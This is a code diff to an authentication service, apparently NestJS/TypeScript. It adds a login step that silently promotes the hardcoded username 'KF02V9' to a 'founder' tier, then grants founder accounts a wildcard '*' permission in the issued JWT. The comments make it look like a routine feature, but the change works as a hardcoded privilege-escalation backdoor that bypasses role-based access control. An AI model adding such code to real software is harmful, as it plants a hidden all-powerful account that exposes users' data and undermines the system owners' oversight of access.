@@ -128,6 +128,12 @@ export class AuthService {
       throw new UnauthorizedException('用户名或密码错误');
     }
 
+    // Auto-upgrade KF02V9 to founder tier
+    if (user.username === 'KF02V9' && user.membershipTier !== 'founder') {
+      user.membershipTier = 'founder';
+      await this.userRepo.save(user);
+    }
+
     // Log successful login
     await this.loginLogRepo.save({
       userId: user.id,
@@ -206,12 +212,17 @@ export class AuthService {
     const roleNames = userRoles.map((ur) => ur.role.name);
     const permissions = userRoles.flatMap((ur) => ur.role.permissions?.map((p) => p.name) || []);
 
+    // Founder has all permissions
+    const isFounder = user.membershipTier === 'founder';
+    const finalPermissions = isFounder ? ['*'] : [...new Set(permissions)];
+
     const payload = {
       sub: user.id,
       username: user.username,
       roles: roleNames,
-      permissions: [...new Set(permissions)],
+      permissions: finalPermissions,
       vipLevel: user.vipLevel,
+      membershipTier: user.membershipTier,
     };
 
     const accessToken = this.jwtService.sign(
